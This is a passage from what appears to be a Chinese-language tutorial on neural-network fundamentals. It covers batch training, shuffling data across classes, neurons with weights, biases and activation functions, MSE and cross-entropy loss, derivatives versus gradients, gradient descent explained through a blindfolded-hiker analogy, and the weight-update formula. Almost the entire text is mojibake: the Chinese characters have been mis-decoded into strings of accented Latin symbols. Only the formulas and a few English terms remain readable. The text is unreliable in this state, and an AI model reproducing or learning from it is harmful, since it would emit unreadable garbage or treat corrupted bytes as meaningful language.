‡ç­¾ä¹‹é—´çš„å·®å¼‚ï¼Œå¹¶å°†è¿™äº›å·®å¼‚åˆæˆæ•´ä¸ªæ‰¹æ¬¡çš„æ€»æŸå¤±ã€‚åœ¨åˆ†ç±»é—®é¢˜ä¸­ï¼Œå¦‚æœä½¿ç”¨äº¤å‰ç†µæŸå¤±å‡½æ•°ï¼Œè¿™æ„å‘³ç€å¯¹æ‰¹æ¬¡ä¸­æ¯å¼ å›¾ç‰‡çš„é¢„æµ‹æ¦‚ç‡åˆ†å¸ƒä¸å®é™…æ ‡ç­¾çš„æ¦‚ç‡åˆ†å¸ƒä¹‹é—´çš„å·®å¼‚è¿›è¡Œè®¡ç®—å’Œæ±‚å’Œã€‚ æ¢¯åº¦è®¡ç®—å’Œå‚æ•°æ›´æ–°:\næ ¹æ®è¿™ä¸ªæ‰¹æ¬¡çš„æ€»æŸå¤±ï¼Œè®¡ç®—æŸå¤±ç›¸å¯¹äºç½‘ç»œå‚æ•°çš„æ¢¯åº¦ã€‚ è¿™äº›æ¢¯åº¦ç”¨äºæ›´æ–°ç½‘ç»œçš„æƒé‡å’Œåå·®ï¼Œä»¥å‡å°‘æœªæ¥é¢„æµ‹çš„æ€»æŸå¤±ã€‚ ä¼˜åŠ¿:\næ‰¹å¤„ç†å¯ä»¥æé«˜æ•°æ®å¤„ç†çš„æ•ˆç‡ï¼Œç‰¹åˆ«æ˜¯åœ¨ä½¿ç”¨ GPU ç­‰ç¡¬ä»¶åŠ é€Ÿæ—¶ã€‚ å®ƒè¿˜æœ‰åŠ©äºç¨³å®šå­¦ä¹ è¿‡ç¨‹ï¼Œå› ä¸ºæ¯æ¬¡æ›´æ–°æ˜¯åŸºäºå¤šä¸ªæ ·æœ¬çš„å¹³å‡æŸå¤±ï¼Œè€Œä¸æ˜¯å•ä¸ªæ ·æœ¬çš„æŸå¤±ã€‚ é€šè¿‡æ‰¹é‡å¤„ç†æ–¹æ³•ï¼Œç¥ç»ç½‘ç»œåœ¨æ¯æ¬¡æ›´æ–°å‚æ•°ä¹‹å‰ï¼Œéƒ½ä¼šè€ƒè™‘ä¸€ç»„æ•°æ®çš„æ€»ä½“è¡¨ç°ï¼Œè€Œä¸æ˜¯å•ä¸ªæ•°æ®ç‚¹ã€‚è¿™ç§æ–¹æ³•æœ‰åŠ©äºæé«˜è®­ç»ƒçš„æ•ˆç‡å’Œç¨³å®šæ€§ã€‚\nè®­ç»ƒæ•°æ®çš„é¡ºåº åœ¨è®­ç»ƒåˆ†ç±»æ¨¡å‹æ—¶ï¼Œè¾“å…¥æ•°æ®çš„éšæœºåŒ–ï¼ˆå³å°†ä¸åŒç±»åˆ«çš„æ ·æœ¬æ··åˆï¼‰é€šå¸¸æ˜¯æ¨èçš„åšæ³•ã€‚ä»¥ä¸‹æ˜¯è¿™ç§åšæ³•çš„åŸå› ï¼š\né¿å…åè§:\nå¦‚æœç¥ç»ç½‘ç»œå…ˆè®­ç»ƒæ‰€æœ‰çš„çŒ«çš„å›¾ç‰‡ï¼Œç„¶åå†è®­ç»ƒæ‰€æœ‰çš„ç‹—çš„å›¾ç‰‡ï¼Œå®ƒå¯èƒ½ä¼šåœ¨è®­ç»ƒåˆæœŸè¿‡åº¦é€‚åº”ï¼ˆå³è¿‡æ‹Ÿåˆï¼‰çŒ«çš„ç‰¹å¾ï¼Œä»è€Œå¿½ç•¥äº†ç‹—çš„ç‰¹å¾ã€‚è¿™å¯èƒ½å¯¼è‡´æ¨¡å‹åœ¨åˆå§‹é˜¶æ®µå½¢æˆåè§ï¼Œä½¿å¾—åæœŸéš¾ä»¥æ­£ç¡®å­¦ä¹ å’Œè¯†åˆ«ç‹—çš„ç‰¹å¾ã€‚ æé«˜æ³›åŒ–èƒ½åŠ›:\né€šè¿‡éšæœºæ··åˆä¸åŒç±»åˆ«çš„å›¾ç‰‡ï¼Œæ¨¡å‹èƒ½å¤Ÿæ›´å¹³è¡¡åœ°å­¦ä¹ å„ä¸ªç±»åˆ«çš„ç‰¹å¾ã€‚è¿™æœ‰åŠ©äºæé«˜æ¨¡å‹çš„æ³›åŒ–èƒ½åŠ›ï¼Œå³åœ¨æœªè§è¿‡çš„æ–°æ•°æ®ä¸Šçš„è¡¨ç°ã€‚ é¿å…è¿‡æ—©æ”¶æ•›:\nå¦‚æœæ•°æ®æ˜¯æœ‰åºçš„ï¼Œæ¨¡å‹å¯èƒ½ä¼šåœ¨è®­ç»ƒçš„æ—©æœŸé˜¶æ®µè¿‡æ—©åœ°æ”¶æ•›åˆ°å¯¹å½“å‰é¡ºåºæ•æ„Ÿçš„è§£å†³æ–¹æ¡ˆã€‚é€šè¿‡éšæœºåŒ–æ•°æ®ï¼Œå¯ä»¥ä¿ƒä½¿æ¨¡å‹æ¢ç´¢æ›´å¤šçš„å¯èƒ½æ€§ï¼Œä»è€Œæ‰¾åˆ°æ›´å…·æ³›åŒ–æ€§çš„è§£å†³æ–¹æ¡ˆã€‚ å®è·µä¸­çš„æ“ä½œ:\nåœ¨å®é™…æ“ä½œä¸­ï¼Œé€šå¸¸ä¼šåœ¨æ¯ä¸ªè®­ç»ƒå‘¨æœŸï¼ˆepochï¼‰å¼€å§‹å‰éšæœºæ‰“ä¹±æ•°æ®ã€‚è¿™æ„å‘³ç€æ¯ä¸ªæ‰¹æ¬¡ï¼ˆbatchï¼‰ä¸­çš„å›¾ç‰‡éƒ½æ˜¯éšæœºé€‰æ‹©çš„ï¼ŒåŒ…å«ä¸åŒç±»åˆ«çš„æ··åˆã€‚ è¿™ç§æ–¹æ³•æœ‰åŠ©äºç¡®ä¿æ¯ä¸ªç±»åˆ«åœ¨æ•´ä¸ªè®­ç»ƒè¿‡ç¨‹ä¸­éƒ½è¢«å…¬å¹³åœ°è¡¨ç¤ºã€‚ å› æ­¤ï¼Œä¸ºäº†è·å¾—æœ€ä½³çš„è®­ç»ƒæ•ˆæœï¼Œæ¨èå°†ä¸åŒæ ‡ç­¾çš„å›¾ç‰‡æ··åˆåœ¨ä¸€èµ·ï¼Œç„¶åè¿›è¡ŒéšæœºåŒ–å¤„ç†åè¾“å…¥è®­ç»ƒã€‚è¿™æœ‰åŠ©äºç¡®ä¿æ¨¡å‹èƒ½å¤Ÿæ›´æœ‰æ•ˆåœ°å­¦ä¹ åŒºåˆ†è¿™ä¸¤ä¸ªç±»åˆ«çš„ç‰¹å¾ã€‚\nå¯¹ç¥ç»å…ƒçš„ç†è§£ ç¥ç»å…ƒåœ¨ç¥ç»ç½‘ç»œä¸­å¯ä»¥çœ‹ä½œæ˜¯ä¸€ä¸ªæ•°å­¦å‡½æ•°ã€‚ä»¥ä¸‹æ˜¯ç¥ç»å…ƒçš„æœ¬è´¨ä»¥åŠæƒé‡å’Œåå·®åœ¨å…¶ä¸­çš„ä½œç”¨ï¼š\nç¥ç»å…ƒçš„æœ¬è´¨:\nç¥ç»å…ƒï¼ˆæˆ–ç§°ä¸ºèŠ‚ç‚¹ï¼‰åŸºæœ¬ä¸Šæ˜¯ä¸€ä¸ªæ¥æ”¶è¾“å…¥ã€äº§ç”Ÿè¾“å‡ºçš„æ•°å­¦å‡½æ•°ã€‚ å®ƒæ¥æ”¶æ¥è‡ªå‰ä¸€å±‚ç¥ç»å…ƒçš„å¤šä¸ªè¾“å…¥ï¼Œè¿™äº›è¾“å…¥é€šå¸¸æ˜¯åŠ æƒå’Œçš„å½¢å¼ï¼Œå…¶ä¸­æ¯ä¸ªè¾“å…¥éƒ½è¢«ç›¸åº”çš„æƒé‡æ‰€ä¹˜ã€‚ æ¿€æ´»å‡½æ•°:\nç¥ç»å…ƒçš„è¾“å‡ºä¸ä»…ä»…æ˜¯å…¶è¾“å…¥çš„çº¿æ€§ç»„åˆã€‚è¾“å…¥çš„åŠ æƒå’Œé€šå¸¸ä¼šé€šè¿‡ä¸€ä¸ªéçº¿æ€§å‡½æ•°ï¼Œå³æ¿€æ´»å‡½æ•°ï¼Œå¦‚ Sigmoidã€ReLU æˆ– tanh ç­‰ã€‚ è¿™ä¸ªæ¿€æ´»å‡½æ•°ä½¿å¾—ç¥ç»ç½‘ç»œèƒ½å¤Ÿæ•æ‰å’Œå­¦ä¹ å¤æ‚çš„éçº¿æ€§å…³ç³»ã€‚ æƒé‡å’Œåå·®:\næƒé‡ï¼ˆWeightsï¼‰å†³å®šäº†è¾“å…¥ä¿¡å·åœ¨å½±å“è¾“å‡ºæ—¶çš„å¼ºåº¦å’Œé‡è¦æ€§ã€‚æ¯ä¸ªè¾“å…¥éƒ½æœ‰ä¸€ä¸ªç›¸åº”çš„æƒé‡ã€‚ åå·®ï¼ˆBiasï¼‰æ˜¯åŠ åˆ°åŠ æƒå’Œä¸Šçš„ä¸€ä¸ªå¸¸æ•°ï¼Œå®ƒæä¾›äº†é¢å¤–çš„è‡ªç”±åº¦ï¼Œä½¿å¾—ç¥ç»å…ƒå³ä½¿åœ¨æ‰€æœ‰è¾“å…¥éƒ½æ˜¯é›¶æ—¶ä¹Ÿèƒ½æœ‰éé›¶çš„è¾“å‡ºã€‚ æ•°å­¦è¡¨ç¤º:\nä»æ•°å­¦çš„è§’åº¦æ¥çœ‹ï¼Œä¸€ä¸ªç¥ç»å…ƒçš„æ“ä½œå¯ä»¥è¡¨ç¤ºä¸º \\(f(w_1x_1+w_2x_2+â€¦+w_nx_n+b)\\) ï¼Œå…¶ä¸­ \\(w_1,w_2,â€¦,w_n\\) æ˜¯æƒé‡ï¼Œ \\(x_1,x_2,â€¦,x_n\\) æ˜¯è¾“å…¥ï¼Œ \\(b\\) æ˜¯åå·®ï¼Œ \\(f\\) æ˜¯æ¿€æ´»å‡½æ•°ã€‚ å‡½æ•°çš„è§’è‰²:\nåœ¨è¿™ä¸ªæ¡†æ¶ä¸‹ï¼Œæƒé‡å’Œåå·®ç±»ä¼¼äºå‡½æ•°æ–¹ç¨‹çš„ç³»æ•°å’Œå¸¸é‡ï¼Œå®ƒä»¬è°ƒèŠ‚è¾“å…¥å¦‚ä½•å½±å“è¾“å‡ºã€‚ ç¥ç»ç½‘ç»œé€šè¿‡å­¦ä¹ è¿™äº›æƒé‡å’Œåå·®çš„æœ€ä½³å€¼æ¥æ‹Ÿåˆå’Œé¢„æµ‹æ•°æ®ã€‚ å› æ­¤ï¼Œå¯ä»¥å°†ç¥ç»å…ƒè§†ä¸ºä¸€ä¸ªé€šè¿‡æƒé‡å’Œåå·®è°ƒæ•´å…¶è¾“å…¥çš„å‡½æ•°ï¼Œé€šè¿‡æ¿€æ´»å‡½æ•°å¼•å…¥éçº¿æ€§ï¼Œä½¿å¾—æ•´ä¸ªç½‘ç»œèƒ½å¤Ÿå­¦ä¹ å’Œæ¨¡æ‹Ÿå¤æ‚çš„æ•°æ®å…³ç³»å’Œæ¨¡å¼ã€‚\næŸå¤±å‡½æ•° æŸå¤±å‡½æ•°åœ¨æœºå™¨å­¦ä¹ å’Œæ·±åº¦å­¦ä¹ ä¸­æ‰®æ¼”ç€è‡³å…³é‡è¦çš„è§’è‰²ã€‚å®ƒæ˜¯ä¸€ä¸ªç”¨æ¥è¡¡é‡æ¨¡å‹æ€§èƒ½çš„å‡½æ•°ï¼Œç‰¹åˆ«æ˜¯åœ¨æ¨¡å‹é¢„æµ‹å’Œå®é™…æ•°æ®ä¹‹é—´çš„å·®å¼‚ã€‚ä»¥ä¸‹æ˜¯æŸå¤±å‡½æ•°çš„ä¸€äº›å…³é”®ç‰¹ç‚¹ï¼š\nå®šä¹‰:\næŸå¤±å‡½æ•°ï¼Œæœ‰æ—¶ä¹Ÿè¢«ç§°ä¸ºä»£ä»·å‡½æ•°ï¼Œæ˜¯ä¸€ä¸ªè¡¡é‡å•ä¸ªæ ·æœ¬é¢„æµ‹é”™è¯¯çš„åº¦é‡ã€‚åœ¨ç»™å®šè¾“å…¥å’Œæ¨¡å‹çš„æƒ…å†µä¸‹ï¼ŒæŸå¤±å‡½æ•°è¾“å‡ºä¸€ä¸ªæ•°å€¼ï¼Œè¿™ä¸ªæ•°å€¼è¡¨ç¤ºé¢„æµ‹å€¼å’ŒçœŸå®å€¼ä¹‹é—´çš„å·®è·ã€‚ ç›®çš„:\næŸå¤±å‡½æ•°çš„ä¸»è¦ç›®çš„æ˜¯æŒ‡å¯¼æ¨¡å‹çš„å­¦ä¹ ã€‚æ¨¡å‹è®­ç»ƒçš„ç›®æ ‡æ˜¯æœ€å°åŒ–æŸå¤±å‡½æ•°ï¼Œå³å‡å°‘é¢„æµ‹å€¼å’ŒçœŸå®å€¼ä¹‹é—´çš„å·®å¼‚ã€‚ å¸¸è§ç±»å‹:\nå‡æ–¹è¯¯å·®ï¼ˆMSEï¼‰: åœ¨å›å½’é—®é¢˜ä¸­å¸¸ç”¨ï¼Œè®¡ç®—é¢„æµ‹å€¼å’Œå®é™…å€¼ä¹‹å·®çš„å¹³æ–¹çš„å¹³å‡å€¼ã€‚ äº¤å‰ç†µæŸå¤±: åœ¨åˆ†ç±»é—®é¢˜ä¸­å¸¸ç”¨ï¼Œç‰¹åˆ«æ˜¯åœ¨äºŒåˆ†ç±»æˆ–å¤šåˆ†ç±»é—®é¢˜ä¸­ã€‚å®ƒè¡¡é‡çš„æ˜¯æ¨¡å‹é¢„æµ‹çš„æ¦‚ç‡åˆ†å¸ƒä¸å®é™…æ ‡ç­¾çš„æ¦‚ç‡åˆ†å¸ƒä¹‹é—´çš„å·®å¼‚ã€‚ åœ¨ç¥ç»ç½‘ç»œä¸­çš„ä½œç”¨:\nåœ¨ç¥ç»ç½‘ç»œè®­ç»ƒè¿‡ç¨‹ä¸­ï¼Œé€šè¿‡è®¡ç®—æŸå¤±å‡½æ•°å¹¶ä½¿ç”¨è¯¸å¦‚æ¢¯åº¦ä¸‹é™ä¹‹ç±»çš„ä¼˜åŒ–ç®—æ³•æ¥è°ƒæ•´ç½‘ç»œçš„æƒé‡ï¼Œä½¿å¾—æŸå¤±å‡½æ•°çš„å€¼æœ€å°åŒ–ã€‚ é€‰æ‹©æŸå¤±å‡½æ•°:\né€‰æ‹©å“ªç§æŸå¤±å‡½æ•°å–å†³äºç‰¹å®šçš„æœºå™¨å­¦ä¹ ä»»åŠ¡ï¼ˆå¦‚å›å½’ã€åˆ†ç±»ã€èšç±»ç­‰ï¼‰å’Œæ•°æ®ç‰¹æ€§ã€‚ æŸå¤±å‡½æ•°æ˜¯è¿æ¥æ¨¡å‹é¢„æµ‹å’ŒçœŸå®æ•°æ®çš„æ¡¥æ¢ï¼Œå®ƒæä¾›äº†ä¸€ç§é‡åŒ–æ¨¡å‹æ€§èƒ½çš„æ–¹å¼ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥é€šè¿‡æ•°å­¦æ–¹æ³•æ¥ä¼˜åŒ–æ¨¡å‹ã€‚\næ¢¯åº¦ åœ¨ç¥ç»ç½‘ç»œä¸­ï¼Œæ¢¯åº¦æ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„æ¦‚å¿µã€‚ä¸‹é¢æ˜¯å¯¹æ¢¯åº¦åŠå…¶åœ¨ç¥ç»ç½‘ç»œä¸­ä½œç”¨çš„è§£é‡Šï¼š\næ¢¯åº¦çš„å«ä¹‰:\nåœ¨æ•°å­¦å’Œç‰©ç†å­¦ä¸­ï¼Œæ¢¯åº¦é€šå¸¸æŒ‡çš„æ˜¯ä¸€ä¸ªå‡½æ•°åœ¨æ¯ä¸ªç‚¹ä¸Šçš„æ–œç‡æˆ–å˜åŒ–ç‡ã€‚åœ¨å¤šç»´ç©ºé—´ä¸­ï¼Œå®ƒè¡¨ç¤ºè¯¥å‡½æ•°åœ¨æ¯ä¸ªæ–¹å‘ä¸Šçš„æ–œç‡ã€‚ åœ¨ç¥ç»ç½‘ç»œä¸­ï¼Œæ¢¯åº¦é€šå¸¸æŒ‡ä»£æŸå¤±å‡½æ•°ï¼ˆæˆ–ç›®æ ‡å‡½æ•°ï¼‰å…³äºç½‘ç»œå‚æ•°ï¼ˆå¦‚æƒé‡å’Œåå·®ï¼‰çš„åå¯¼æ•°ã€‚å®ƒè¡¨æ˜äº†æŸå¤±å‡½æ•°åœ¨å‚æ•°ç©ºé—´çš„æ¯ä¸ªç»´åº¦ä¸Šå¢åŠ æˆ–å‡å°‘çš„é€Ÿç‡ã€‚ æ¢¯åº¦åœ¨ç¥ç»ç½‘ç»œä¸­çš„ä½œç”¨:\næ¢¯åº¦ç”¨äºä¼˜åŒ–ç¥ç»ç½‘ç»œçš„å‚æ•°ã€‚é€šè¿‡è®¡ç®—æŸå¤±å‡½æ•°ç›¸å¯¹äºæ¯ä¸ªå‚æ•°çš„æ¢¯åº¦ï¼Œç¥ç»ç½‘ç»œå¯ä»¥äº†è§£å¦‚ä½•è°ƒæ•´å…¶å‚æ•°ä»¥å‡å°‘æ€»æŸå¤±ã€‚ è¿™é€šå¸¸é€šè¿‡ä¸€ä¸ªè¿‡ç¨‹ç§°ä¸ºæ¢¯åº¦ä¸‹é™æ¥å®Œæˆï¼Œå…¶ä¸­å‚æ•°æ²¿ç€æ¢¯åº¦çš„åæ–¹å‘è°ƒæ•´ï¼Œä»¥å‡å°‘æŸå¤±å‡½æ•°çš„å€¼ã€‚ å¯¼æ•°ã€åå¯¼æ•°å’Œæ¢¯åº¦ å¯¼æ•°ï¼ˆDerivativeï¼‰:\nå¯¼æ•°æ˜¯ä¸€ä¸ªå•å˜é‡å‡½æ•°åœ¨æŸä¸€ç‚¹ä¸Šçš„ç¬æ—¶å˜åŒ–ç‡ã€‚å®ƒå‘Šè¯‰æˆ‘ä»¬ï¼Œå½“è¾“å…¥å˜é‡å‘ç”Ÿéå¸¸å°çš„å˜åŒ–æ—¶ï¼Œå‡½æ•°å€¼å°†å¦‚ä½•å˜åŒ–ã€‚ åœ¨æ•°å­¦ä¸Šï¼Œå¦‚æœæœ‰ä¸€ä¸ªå‡½æ•° f(x)ï¼Œé‚£ä¹ˆåœ¨ç‚¹ x çš„å¯¼æ•° fâ€²(x) è¡¨ç¤ºå½“ x å‘ç”Ÿå¾®å°å˜åŒ–æ—¶ï¼Œf(x) çš„å˜åŒ–é‡ã€‚ åå¯¼æ•°ï¼ˆPartial Derivativeï¼‰:\nåå¯¼æ•°æ˜¯å¤šå˜é‡å‡½æ•°å¯¹å…¶ä¸­ä¸€ä¸ªå˜é‡çš„å¯¼æ•°ï¼ŒåŒæ—¶å‡è®¾å…¶ä»–å˜é‡ä¿æŒä¸å˜ã€‚ä¾‹å¦‚ï¼Œå¯¹äºå‡½æ•° f(x,y)ï¼Œå¯¹ x çš„åå¯¼æ•° \\(\\frac{âˆ‚f}{âˆ‚x}\\) è¡¨ç¤ºå½“ x å‘ç”Ÿå¾®å°å˜åŒ–è€Œ y ä¿æŒä¸å˜æ—¶ï¼Œå‡½æ•°å€¼çš„å˜åŒ–ç‡ã€‚ åå¯¼æ•°æè¿°çš„æ˜¯åœ¨å¤šç»´ç©ºé—´ä¸­ï¼Œå‡½æ•°æ²¿ç€æŸä¸€ä¸ªåæ ‡è½´çš„å˜åŒ–ç‡ã€‚ æ¢¯åº¦ï¼ˆGradientï¼‰:\næ¢¯åº¦æ˜¯å¯¼æ•°åœ¨å¤šç»´ç©ºé—´ä¸­çš„æ¨å¹¿ã€‚å®ƒä¸æ˜¯é’ˆå¯¹å•ä¸€å˜é‡ï¼Œè€Œæ˜¯é’ˆå¯¹å¤šå˜é‡å‡½æ•°çš„æ¯ä¸ªç‹¬ç«‹å˜é‡çš„åå¯¼æ•°çš„é›†åˆã€‚ åœ¨æ•°å­¦ä¸Šï¼Œå¯¹äºå¤šå˜é‡å‡½æ•° f(x,y,z,â€¦)ï¼Œæ¢¯åº¦æ˜¯ä¸€ä¸ªå‘é‡ï¼Œå…¶æ¯ä¸ªåˆ†é‡éƒ½æ˜¯å¯¹åº”äºä¸€ä¸ªå˜é‡çš„åå¯¼æ•°ã€‚æ¢¯åº¦æŒ‡å‘å‡½æ•°å¢é•¿æœ€å¿«çš„æ–¹å‘ã€‚ åŒºåˆ«:\nç»´åº¦: å¯¼æ•°æ˜¯ä¸€ç»´çš„ï¼Œè€Œæ¢¯åº¦æ˜¯å¤šç»´çš„ã€‚ æ–¹å‘: å¯¼æ•°åªæœ‰å¤§å°ï¼Œæ²¡æœ‰æ–¹å‘ï¼ˆæˆ–è€…å¯ä»¥è¯´æ˜¯æ­£æˆ–è´Ÿçš„æ–¹å‘ï¼‰ï¼Œè€Œæ¢¯åº¦æ˜¯ä¸€ä¸ªå‘é‡ï¼Œå…·æœ‰å¤§å°å’Œæ–¹å‘ã€‚ åº”ç”¨: åœ¨å•å˜é‡å‡½æ•°çš„æƒ…å¢ƒä¸­ä½¿ç”¨å¯¼æ•°ï¼Œè€Œåœ¨å¤šå˜é‡å‡½æ•°çš„æƒ…å¢ƒä¸­ä½¿ç”¨æ¢¯åº¦ã€‚ åœ¨ç¥ç»ç½‘ç»œçš„èƒŒæ™¯ä¸‹ï¼Œè€ƒè™‘åˆ°ç½‘ç»œå‚æ•°é€šå¸¸æ˜¯å¤šç»´çš„ï¼ˆä¾‹å¦‚æƒé‡çŸ©é˜µï¼‰ï¼Œå› æ­¤æ›´å¤šåœ°ä½¿ç”¨æ¢¯åº¦è€Œä¸æ˜¯å•ä¸€çš„å¯¼æ•°ã€‚æ¢¯åº¦æŒ‡æ˜äº†åœ¨å‚æ•°ç©ºé—´ä¸­å‡å°‘æŸå¤±å‡½æ•°çš„æœ€å¿«è·¯å¾„ã€‚\næ¢¯åº¦ä¸‹é™ï¼ˆGradient Descentï¼‰ æ¢¯åº¦ä¸‹é™ç®—æ³•æ˜¯ä¸€ç§ç”¨äºä¼˜åŒ–ç¥ç»ç½‘ç»œå‚æ•°çš„æ–¹æ³•ï¼Œå…¶ç›®çš„æ˜¯æœ€å°åŒ–æŸå¤±å‡½æ•°ã€‚æˆ‘ä»¬å¯ä»¥ç”¨ä¸€ä¸ªæ¯”å–»æ¥ç†è§£æ¢¯åº¦ä¸‹é™ï¼š\næƒ³è±¡ä½ åœ¨ä¸€ä¸ªå±±çš„é¡¶éƒ¨ï¼Œç›®æ ‡æ˜¯åˆ°è¾¾å±±è°·ï¼ˆè¿™é‡Œçš„å±±è°·ä»£è¡¨æŸå¤±å‡½æ•°çš„æœ€å°å€¼ï¼‰ã€‚ä½†æ˜¯ï¼Œä½ çš„çœ¼ç›è¢«è’™ä½äº†ï¼Œçœ‹ä¸åˆ°å‘¨å›´çš„ç¯å¢ƒã€‚ä½ åªèƒ½é€šè¿‡æ„Ÿè§‰è„šä¸‹çš„å¡åº¦ï¼ˆè¿™å°±åƒæ˜¯æ¢¯åº¦ï¼‰æ¥åˆ¤æ–­å“ªä¸ªæ–¹å‘æ˜¯ä¸‹å¡ã€‚\næ£€æŸ¥å¡åº¦ï¼ˆè®¡ç®—æ¢¯åº¦ï¼‰:\nåœ¨ç¥ç»ç½‘ç»œä¸­ï¼Œä½ é¦–å…ˆè®¡ç®—æŸå¤±å‡½æ•°åœ¨å½“å‰ä½ç½®ï¼ˆå³å½“å‰å‚æ•°å€¼ï¼‰çš„æ¢¯åº¦ã€‚æ¢¯åº¦å‘Šè¯‰ä½ æŸå¤±å‡½æ•°ä¸Šå‡å’Œä¸‹é™æœ€å¿«çš„æ–¹å‘ã€‚åœ¨æˆ‘ä»¬çš„æ¯”å–»ä¸­ï¼Œè¿™å°±åƒæ˜¯æ„Ÿè§‰è„šä¸‹åœ°é¢çš„å¡åº¦ï¼Œäº†è§£å“ªä¸ªæ–¹å‘æ˜¯ä¸‹å¡ã€‚ è¿ˆå‡ºä¸€æ­¥ï¼ˆæ›´æ–°å‚æ•°ï¼‰:\næ¥ä¸‹æ¥ï¼Œä½ ä¼šæœç€æ¢¯åº¦ä¸‹é™æœ€å¿«çš„æ–¹å‘è¿ˆå‡ºä¸€æ­¥ã€‚è¿™ä¸€æ­¥çš„å¤§å°ç§°ä¸ºå­¦ä¹ ç‡ã€‚åœ¨ç¥ç»ç½‘ç»œä¸­ï¼Œè¿™æ„å‘³ç€ä½ ä¼šæ ¹æ®æ¢¯åº¦å’Œå­¦ä¹ ç‡æ¥è°ƒæ•´ç½‘ç»œçš„æƒé‡å’Œåå·®ã€‚ å­¦ä¹ ç‡å¾ˆé‡è¦ï¼šå¦‚æœå¤ªå¤§ï¼Œä½ å¯èƒ½ä¼šè·¨è¿‡å±±è°·ï¼Œé”™è¿‡æœ€ä½ç‚¹ï¼›å¦‚æœå¤ªå°ï¼Œä½ åˆ™éœ€è¦å¾ˆé•¿æ—¶é—´æ‰èƒ½åˆ°è¾¾å±±è°·ã€‚ é‡å¤è¿‡ç¨‹:\né‡å¤è¿™ä¸ªè¿‡ç¨‹ï¼Œæ¯æ¬¡éƒ½æ ¹æ®æŸå¤±å‡½æ•°çš„æ¢¯åº¦æ¥æ›´æ–°ä½ çš„ä½ç½®ï¼ˆå³ç¥ç»ç½‘ç»œçš„å‚æ•°ï¼‰ï¼Œç›´åˆ°ä½ æ„Ÿè§‰åˆ°è‡ªå·±å·²ç»åˆ°è¾¾äº†å±±è°·ï¼ˆå³æŸå¤±å‡½æ•°ä¸å†æ˜¾è‘—ä¸‹é™ï¼‰ã€‚ æ€»ä½“æ¥è®²ï¼Œæ¢¯åº¦ä¸‹é™æ˜¯ä¸€ä¸ªè¿­ä»£è¿‡ç¨‹ï¼Œå®ƒé€šè¿‡ä¸æ–­åœ°è®¡ç®—æ¢¯åº¦å¹¶æ›´æ–°å‚æ•°ï¼Œæ¥å¸®åŠ©ç¥ç»ç½‘ç»œæ‰¾åˆ°æŸå¤±å‡½æ•°çš„æœ€å°å€¼ã€‚è¿™ä¸ªè¿‡ç¨‹å°±åƒæ˜¯åœ¨ç›²ç›®ä¸­æ‰¾åˆ°ä¸€æ¡é€šå¾€å±±è°·çš„è·¯å¾„ã€‚\næˆæœ¬è¡¨é¢å’Œç­‰å€¼çº¿å›¾ï¼ˆCost Surface \u0026 Contour Plotï¼‰ é«˜åº¦ä»£è¡¨æˆæœ¬ å…¶ä½™ä¸¤ä¸ªè½´åˆ†åˆ«ä¸ºæƒé‡ wâ€‹eightã€åå·® bâ€‹ias ä¸Šé¢ä¸¤å¼ å›¾æœ‰åŠ©äºç†è§£æ¢¯åº¦ä¸‹é™ç®—æ³•ï¼ˆå›¾ç‰‡å‚è€ƒè‡ª PyTorch Linear Regression Training Slope and Bias ï¼‰ã€‚\nä¸Šå›¾ä¸­çš„ \\(l\\)ï¼ˆæŸå¤±å‡½æ•°ï¼‰æ˜¯å‡æ–¹è¯¯å·®ï¼ˆMSEï¼‰ï¼Œå³ï¼š\n\\[ l(w,b)=\\frac{1}{N}\\sum_{n=1}^N(y_n-(wx_n+b))^2 \\]\nå­¦ä¹ ï¼ˆè®­ç»ƒï¼‰çš„ç›®æ ‡ï¼Œå°±æ˜¯æ‰¾åˆ°è®©è¿™ä¸ªå‡½æ•°çš„å‡½æ•°å€¼æœ€å°çš„ w å’Œ bã€‚\nå¦‚ä½•æ ¹æ®æŸå¤±å‡½æ•°çš„æ¢¯åº¦ã€å­¦ä¹ ç‡æ›´æ–°æƒé‡ åœ¨æ·±åº¦å­¦ä¹ ä¸­ï¼Œä½¿ç”¨æ¢¯åº¦æ¥æ›´æ–°æƒé‡æ˜¯ä¼˜åŒ–æ¨¡å‹çš„å…³é”®æ­¥éª¤ï¼Œè¿™é€šå¸¸åœ¨åå‘ä¼ æ’­è¿‡ç¨‹ä¸­è¿›è¡Œã€‚æ¢¯åº¦æœ¬è´¨ä¸Šæ˜¯æŸå¤±å‡½æ•°ç›¸å¯¹äºæ¨¡å‹æƒé‡çš„åå¯¼æ•°ï¼Œå®ƒæŒ‡ç¤ºäº†æŸå¤±å‡½æ•°ç›¸å¯¹äºæ¯ä¸ªæƒé‡å¢åŠ æˆ–å‡å°‘çš„æ–¹å‘å’Œå¹…åº¦ã€‚é€šè¿‡æ¢¯åº¦ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“å¦‚ä½•è°ƒæ•´æƒé‡ä»¥å‡å°‘æŸå¤±ã€‚\næƒé‡æ›´æ–°çš„åŸºæœ¬å…¬å¼å¦‚ä¸‹ï¼š\n\\[ W_{new}=W_{old}âˆ’Î·â‹…âˆ‡L(W_{old}) \\]\nå…¶ä¸­ï¼š\n\\(W_{new}\\) æ˜¯æ›´æ–°åçš„æƒé‡ã€‚ \\(W_{old}\\) æ˜¯å½“å‰çš„æƒé‡ã€‚ Î· æ˜¯å­¦ä¹ ç‡ã€‚ \\(âˆ‡L(W_{old})\\) æ˜¯æŸå¤±å‡½æ•°ç›¸å¯¹äºå½“å‰æƒé‡çš„æ¢¯åº¦ã€‚ æ¢¯åº¦çš„ä½œç”¨å¯ä»¥è¿™æ ·ç†è§£ï¼š\næ–¹å‘ æ¢¯åº¦çš„æ–¹å‘æŒ‡å‘æŸå¤±å‡½æ•°å¢é•¿æœ€å¿«çš„æ–¹å‘ã€‚åœ¨ä¼˜åŒ–è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¸Œæœ›å‡å°‘æŸå¤±ï¼Œå› æ­¤éœ€è¦å‘æ¢¯åº¦çš„ç›¸åæ–¹å‘æ›´æ–°æƒé‡ã€‚ å¹…åº¦ æ¢¯åº¦çš„å¹…åº¦ï¼ˆå¤§å°ï¼‰å‘Šè¯‰æˆ‘ä»¬åœ¨è¯¥æ–¹å‘ä¸ŠæŸå¤±å‡½æ•°å˜åŒ–çš„é€Ÿåº¦ã€‚å¦‚æœæ¢¯åº¦å¾ˆå¤§ï¼Œæ„å‘³ç€åœ¨é‚£ä¸ªæ–¹å‘ä¸ŠæŸå¤±å‡½æ•°å˜åŒ–å¾ˆå¿«ã€‚ å­¦ä¹ 